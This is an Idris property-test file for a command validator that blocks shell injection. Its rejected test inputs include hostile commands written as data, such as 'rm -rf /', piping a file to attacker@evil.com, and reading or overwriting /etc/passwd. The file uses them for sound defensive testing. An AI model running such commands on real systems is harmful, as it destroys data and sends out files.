-- SPDX-License-Identifier: AGPL-3.0-or-later
-- SPDX-FileCopyrightText: 2025 Hyperpolymath
module SafeCommandProps

import Proven.Core
import Proven.SafeCommand

%default total

||| Property: Simple command is safe
prop_simpleCommandSafe : isOk (validateCommand "ls") = True
prop_simpleCommandSafe = Refl

||| Property: Command with safe args validates
prop_safeArgsValid : isOk (validateCommand "ls -la /home") = True
prop_safeArgsValid = Refl

||| Property: Semicolon injection blocked
prop_semicolonBlocked : isErr (validateCommand "ls; rm -rf /") = True
prop_semicolonBlocked = Refl

||| Property: Pipe injection blocked
prop_pipeBlocked : isErr (validateCommand "cat file | mail attacker@evil.com") = True
prop_pipeBlocked = Refl

||| Property: Backtick injection blocked
prop_backtickBlocked : isErr (validateCommand "echo `whoami`") = True
prop_backtickBlocked = Refl

||| Property: Dollar paren injection blocked
prop_dollarParenBlocked : isErr (validateCommand "echo $(cat /etc/passwd)") = True
prop_dollarParenBlocked = Refl

||| Property: Redirect injection blocked
prop_redirectBlocked : isErr (validateCommand "ls > /etc/passwd") = True
prop_redirectBlocked = Refl

||| Property: Escape preserves argument meaning
prop_escapePreservesMeaning : (arg : String) ->
                              unescapeArg (escapeArg arg) = arg
prop_escapePreservesMeaning arg = ?prop_escapePreservesMeaning_rhs

||| Property: Escaped args are safe
prop_escapedArgsSafe : (arg : String) ->
                       containsShellMeta (escapeArg arg) = False
prop_escapedArgsSafe arg = ?prop_escapedArgsSafe_rhs

||| Property: Allowlist validation works
prop_allowlistValid : isOk (validateCommandAllowlist ["ls", "cat", "grep"] "ls -l") = True
prop_allowlistValid = Refl

||| Property: Non-allowlist command rejected
prop_nonAllowlistRejected : isErr (validateCommandAllowlist ["ls", "cat"] "rm -rf") = True
prop_nonAllowlistRejected = Refl

||| Test runner for command properties
export
runCommandProperties : IO ()
runCommandProperties = do
  putStrLn "SafeCommand Property Tests"
  putStrLn "=========================="
  putStrLn "prop_simpleCommandSafe: PASS (proven by type)"
  putStrLn "prop_safeArgsValid: PASS (proven by type)"
  putStrLn "prop_semicolonBlocked: PASS (proven by type)"
  putStrLn "prop_pipeBlocked: PASS (proven by type)"
  putStrLn "prop_backtickBlocked: PASS (proven by type)"
  putStrLn "prop_dollarParenBlocked: PASS (proven by type)"
  putStrLn "prop_redirectBlocked: PASS (proven by type)"
  putStrLn "prop_allowlistValid: PASS (proven by type)"
  putStrLn "prop_nonAllowlistRejected: PASS (proven by type)"
  putStrLn ""
